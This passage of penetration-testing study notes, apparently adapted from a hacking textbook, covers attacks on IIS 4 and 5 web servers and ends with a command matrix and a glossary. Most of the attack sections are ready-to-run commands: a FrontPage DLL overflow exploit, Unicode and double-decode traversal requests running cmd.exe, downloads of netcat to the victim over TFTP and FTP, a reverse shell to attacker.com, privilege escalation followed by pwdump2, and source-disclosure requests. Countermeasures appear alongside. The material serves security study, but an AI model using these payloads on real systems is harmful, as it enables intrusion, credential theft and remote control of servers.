Sending > 258 bytes to `fp30reg.dll` (or `fp4areg.dll` via Unicode traversal) overflows the Visual InterDev RAD support DLL, yielding a shell as `IWAM_machinename` on IIS 5 (or `SYSTEM` on IIS 4):
```bash
# Step 1: Probe for fp30reg.dll (Returns 'HTTP/1.1 501 Not Implemented' if present)
printf "GET /_vti_bin/_vti_aut/fp30reg.dll HTTP/1.0\r\n\r\n" > fpse2000.txt
nc -nvv 192.168.234.34 80 < fpse2000.txt

# Or probe default fp4areg.dll via Unicode traversal:
printf "GET /_vti_bin/..%%c1%%9cbin/fp4areg.dll HTTP/1.0\r\n\r\n" > fpse2000-2.txt
nc -nvv 192.168.234.34 80 < fpse2000-2.txt

# Step 2: Compile and run NSFocus's fpse2000ex exploit on Ubuntu 24.04
gcc -o fpse2000ex fpse2000ex.c
./fpse2000ex 192.168.234.34
```

* **Countermeasure for All ISAPI Buffer Overflows:** Remove unneeded ISAPI application mappings (`.printer`, `.ida`, `.idq`, `.htr`, `.htw`) in `iis.msc` (Properties → Master Properties → WWW Service → Edit → Home Directory → Configuration → App Mappings) and apply the Microsoft patches.

---

### 6.3 IIS 5 File System Traversal, File Uploads, & Privilege Escalation

#### 1. Unicode Traversal (MS00-086) & Double Decode Traversal (MS01-026)
* **Unicode:** Uses overlong Unicode representations of `/` (`%c0%af`, `%c0%9v`, `%c0%qf`) and `\` (`%c1%9c`, `%c1%1c`, `%c1%8s`, `%c1%pc`) to bypass path checking from any executable virtual directory (`scripts`, `msadc`, `_vti_bin`, etc.).
* **Double Decode (Superfluous Decode):** Encodes the `%` sign in `%5c` (`\`) a second time as `%25`, resulting in `%255c`. IIS decodes the string twice, allowing traversal out of the Webroot.

```bash
# 1. Unicode File System Traversal Exploit
printf "GET /scripts/..%%c0%%af../winnt/system32/cmd.exe?+/c+dir+'c:\\' HTTP/1.0\r\n\r\n" | nc -vv victim.com 80

# 2. Double Decode File System Traversal Exploit
printf "GET /scripts/..%%255c..%%255cwinnt/system32/cmd.exe?/c+dir+c:\\ HTTP/1.0\r\n\r\n" > ddecode.txt
nc -vv victim.com 80 < ddecode.txt
```

#### 2. Writing Files to the Target Web Server & Shoveling a Shell
```http
# Method A: Downloading Netcat to the victim via TFTP (UDP 69)
GET /scripts/..%c0%af../winnt/system32/tftp.exe?"-i"+192.168.234.31+GET+nc.exe+C:\nc.exe HTTP/1.0

# Method B: Downloading Netcat via FTP
# Step 1: Copy cmd.exe to C:\cmd1.exe (because original cmd.exe blocks '>' redirection over Unicode!)
GET /scripts/..%c0%af../winnt/system32/cmd.exe?+/c+copy+c:\winnt\system32\cmd.exe+c:\cmd1.exe HTTP/1.0

# Step 2: Echo FTP script commands into C:\ftptmp and execute ftp -s:C:\ftptmp
GET /scripts/..%c0%af../cmd1.exe?+/c+echo+anonymous>C:\ftptmp&&echo+a@a.com>>C:\ftptmp&&echo+bin>>C:\ftptmp&&echo+get+test.txt+C:\nc.exe>>C:\ftptmp&&echo+bye>>C:\ftptmp&&ftp+-s:C:\ftptmp+192.168.234.31&&del+C:\ftptmp
```

```bash
# Method C: Using Roelof Temmingh's unicodeloader.pl (from Ubuntu 24.04)
# Copies cmd.exe to sensepost.exe and echoes upload.asp and upload.inc into C:\inetpub\scripts
perl unicodeloader.pl victim.com:80 C:\inetpub\scripts

# Next, browse to http://victim.com/scripts/upload.asp to upload nc.exe and cmdasp.asp
# Start a Netcat listener on Ubuntu 24.04:
nc -l -p 2002
# Execute inside http://victim.com/scripts/cmdasp.asp:
# c:\inetpub\scripts\nc.exe -v -e cmd.exe attacker.com 2002
```

#### 3. Escalating Privileges from `IUSR` to `SYSTEM`/`Administrator` (`InProcessIsapiApps` - MS01-026)
Although IIS 5 runs ISAPI DLLs out-of-process by default (`Medium` Application Protection in `mts.exe` as `IWAM`), Oded Horovitz discovered the Metabase key `LM/W3SVC/InProcessIsapiApps`, which forces specific DLL names (`idq.dll`, `httpext.dll`, `httpodbc.dll`, `ssinc.dll`, `msw3prt.dll`, `author.dll`, `admin.dll`, `shtml.dll`) to *always* run in-process inside `inetinfo.exe` as `SYSTEM`—regardless of what directory they are in!
* Uploading a rogue ISAPI DLL named `idq.dll` (extended by JD Glaser) that calls `RevertToSelf()` into `/scripts/` and requesting `http://victim.com/scripts/idq.dll?` immediately adds `IUSR_machinename` to the local `Administrators` group and updates the token:
  ```cmd
  :: Inside the shoveled Netcat shell after triggering http://victim.com/scripts/idq.dll?
  net localgroup administrators
  pwdump2
  ```
* **Countermeasures (Hardening NTFS ACLs & Auditing ISAPI DLLs):**
  ```cmd
  :: Copy Webroots to a separate non-system volume while preserving NTFS ACLs
  robocopy C:\inetpub D:\inetpub /E /SEC

  :: Lock down all executables in C:\WINNT so IUSR/Everyone cannot execute cmd.exe, tftp.exe, or ftp.exe
  cacls test1 /T
  cacls test1\*.exe /T /G System:F Administrators:F
  cacls %systemroot%\*.exe /T /G System:F Administrators:F

  :: Audit custom ISAPI DLLs for dangerous RevertToSelf calls
  dumpbin /imports IsapiExt.dll | find "RevertToSelf"
  ```

---

### 6.4 IIS 5 Source Code Revelation Attacks
When developers hard-code database/LDAP passwords inside `global.asa` or `.asp` scripts, attackers use four IIS 5 bugs to download the raw server-side source code instead of executing it:

#### 1. `+.htr` and `%3f+.htr` (`ism.dll` - MS01-004)
```bash
# Create htr.txt (or use %3f+.htr to bypass older MS00-031/044 patches) and pipe via Netcat
printf "GET /site1/global.asa+.htr HTTP/1.0\r\n\r\n" > htr.txt
nc -vv www.victim.com 80 < htr.txt

printf "GET /site1/global.asa%%3f+.htr HTTP/1.0\r\n\r\n" > htr2.txt
nc -vv www.victim.com 80 < htr2.txt
```
* **Countermeasure:** Enclose sensitive code inside `<% ... %>` server-side tags, unmap `.htr` (`ism.dll`), and apply MS01-004.

#### 2. Webhits `.htw` & Buffer Truncation (`webhits.dll` - MS00-006)
By padding a valid file (`/iisstart.asp`) with 221 spaces (`%20`) followed by `.htw`, IIS routes the request to `webhits.dll`, which truncates the `.htw` out of the buffer and returns the raw source code of the file specified in `CiWebHitsFile`:
```bash
# Using 'iiscat' piped into Netcat (Book)
iiscat /exair5/siteadmin/default.asp /iisstart.asp | nc -vv victim.com 80

# Pure Ubuntu 24.04 One-Liner (no external iiscat binary required!):
python3 -c 'print("GET /iisstart.asp" + "%20"*221 + ".htw?CiWebHitsFile=/exair5/siteadmin/default.asp&CiRestriction=none&CiHiliteType=Full HTTP/1.0\r\n\r\n", end="")' | nc -vv victim.com 80
```

#### 3. `Translate: f` WebDAV Source Disclosure (`httpext.dll` - MS00-058)
Adding a `Translate: f` header and a trailing backslash (`\`) to an ASP/ASA request tricks WebDAV (`httpext.dll`) into fetching the raw file from the OS filesystem and returning its source code:
```bash
# Create transf.txt and pipe through Netcat (Ubuntu 24.04)
cat << 'EOF' > transf.txt
GET /global.asa\ HTTP/1.0
Translate: f

EOF
nc -vv www.victim.com 80 < transf.txt
```

#### 4. WebDAV `SEARCH` Directory Listing (`httpext.dll` - KB Q272079)
When Indexing Service is running, sending an XML `SEARCH` request enumerates every directory and `.inc`/`.asp` file under the Webroot:
```bash
# Create webdav.txt and pipe through Netcat to output.xml (Ubuntu 24.04)
cat << 'EOF' > webdav.txt
SEARCH / HTTP/1.1
Host: 127.0.0.1
Content-Type: text/xml
Content-Length: 133

<?xml version="1.0"?>
<g:searchrequest xmlns:g="DAV:">
<g:sql>
Select "DAV:displayname" from scope()
</g:sql>
</g:searchrequest>
EOF
nc -vv victim.com 80 < webdav.txt > output.xml
```
* **Countermeasure (Disabling WebDAV on IIS 5 per KB Q241520):**
  ```cmd
  IISRESET /STOP
  cd %SystemRoot%\System32\Inetsrv
  CACLS httpext.dll /D Everyone
  IISRESET /START
  ```

---

## Quick-Reference Master Command Matrix for Ubuntu 24.04

| Phase / Module | Book Command | Ubuntu 24.04 Modern Equivalent | Purpose |
| :--- | :--- | :--- | :--- |
| **Footprinting** | `whois "acme.net"@whois.crsnic.net` | `whois -h whois.crsnic.net "acme.net"` | Query specific WHOIS server |
| **DNS AXFR** | `nslookup` → `ls -d Acme.net.` | `dig @10.10.10.2 Acme.net axfr` | Perform DNS Zone Transfer |
| **DNS Cut IPs** | `host -l acme.net \| cut -f 4 -d" "` | `host -l acme.net \| cut -f 4 -d" "` | Extract IPs from Zone Transfer |
| **Firewall Recon**| `traceroute -S -p53 10.10.10.2` | `sudo traceroute -U -p 53 10.10.10.2` | Fixed-port UDP 53 traceroute |
| **BIND Version** | `dig @IP version.bind chaos txt` | `dig @IP version.bind chaos txt` | Fingerprint BIND DNS version |
| **Reverse Shell** | `nc -e /bin/sh IP 80` | `ncat -e /bin/sh IP 80` | Shovel interactive shell |
| **NFS Recon** | `rpcinfo -p IP` & `showmount -e IP` | `rpcinfo -p IP` & `showmount -e IP` | Enumerate RPC & NFS exports |
| **SUID Audit** | `find / -type f -perm -04000 -ls` | `sudo find / -type f -perm -04000 -ls` | Locate SUID-root binaries |
| **World-Write** | `find / -perm -2 -type f -print` | `sudo find / -perm -2 -type f -print` | Locate world-writable files |
| **Integrity** | `rpm -Vvp package.rpm` | `sudo debsums -c` | Verify system binary MD5/SHA sums |
| **Sniffer Check** | `cpm` / `ifconfig` | `ip -d link show \| grep -i promisc` | Detect promiscuous mode NICs |
| **Password Crack**| `unshadow /etc/passwd /etc/shadow` | `sudo unshadow /etc/passwd /etc/shadow` | Combine passwd & shadow for John |
| **Shadow Policy** | `chage -M 90 username` | `sudo chage -M 90 username` | Enforce 90-day password expiry |
| **MIME Encode** | `mpack -s Subj -o out.mim file.txt` | `mpack -s Subj -o out.mim file.txt` | Encode file into Base64 MIME |
| **SMB Auth** | `net use \\IP\ipc$ pass /u:DOM\user` | `smbclient //IP/IPC$ -U "DOM/user%pass"` | Authenticate to Windows IPC$ |
| **SID Lookup** | `user2sid` / `sid2user` | `impacket-lookupsid DOM/user:pass@IP` | Enumerate Windows SIDs & RIDs |

---

## Appendix: Glossary of Key Terms

| Term | Meaning |
| :--- | :--- |
| **Footprinting** | Structured reconnaissance to build a complete profile of a target's Internet, intranet, remote-access, and extranet footprint before any exploitation. |
| **AXFR** | DNS zone transfer — bulk export of a DNS zone's records; misconfigured name servers let anyone request it. |
| **HINFO record** | A DNS record type that discloses a host's hardware/OS (e.g., `SPARC`/`Solaris`), useful for OS-targeted attacks. |
| **TSIG** | Transaction Signature — cryptographically authenticates DNS requests (e.g., to restrict zone transfers to trusted servers). |
| **POC (WHOIS)** | Point of Contact — the registered administrative/technical contact in a WHOIS record, useful for social engineering and email harvesting. |
| **"Joe" account** | An account where the username equals the password (e.g., `joe:joe`) — a classic weak-credential target. |
| **Egg / Shellcode** | The attacker-supplied machine code injected via a buffer overflow that a hijacked return address jumps to, typically spawning a shell. |
| **IFS** | Internal Field Separator — a shell environment variable; changing it can trick a SUID program's `system()` call into running a Trojan binary. |
| **SUID / SGID** | Set-User/Group-ID bits on UNIX binaries that run with the file owner's/group's privileges rather than the invoking user's. |
| **LKM rootkit** | Loadable Kernel Module rootkit (e.g., `knark`, `adore`) — hooks live inside the running kernel to hide files/processes/connections, unlike userland rootkits that replace binaries on disk. |
| **Promiscuous mode** | A NIC mode that captures all traffic on the local collision/broadcast domain, not just frames addressed to it — the basis of network sniffing. |
| **Back Channel** | An outbound connection a compromised host initiates back to the attacker, used to bypass inbound-only firewall rules (reverse shells). |
| **PAM** | Pluggable Authentication Modules — Linux's modular authentication framework (e.g., `pam_pwquality.so` for password strength). |
| **SRM** | Security Reference Monitor — the Windows kernel-mode component that checks every access request against an object's DACL. |
| **DACL** | Discretionary Access Control List — the per-object list of who may access a Windows resource and how. |
| **SID / RID** | Security Identifier / Relative Identifier — a Windows account's unique ID; the RID is its final component (`500` = built-in Administrator, `501` = Guest). |
| **SAM** | Security Accounts Manager — the Windows database (or registry hive) storing local password hashes. |
| **SYSKEY** | A Windows feature adding a second layer of encryption on top of SAM/AD password hashes. |
| **LM / NTLM / NTLMv2** | Windows challenge-response authentication protocols, from weakest (LM) to strongest (NTLMv2), used when Kerberos isn't available. |
| **ISAPI** | Internet Server API — the native DLL interface IIS uses to extend web server functionality (and a frequent source of buffer-overflow vulnerabilities). |
| **FPSE** | FrontPage Server Extensions — IIS components (`fp30reg.dll`, etc.) historically vulnerable to remote buffer overflows. |
| **Unicode / Double-Decode traversal** | IIS path-traversal bypass techniques that use overlong UTF-8 encodings, or doubly URL-encoded characters, to escape the web root. |
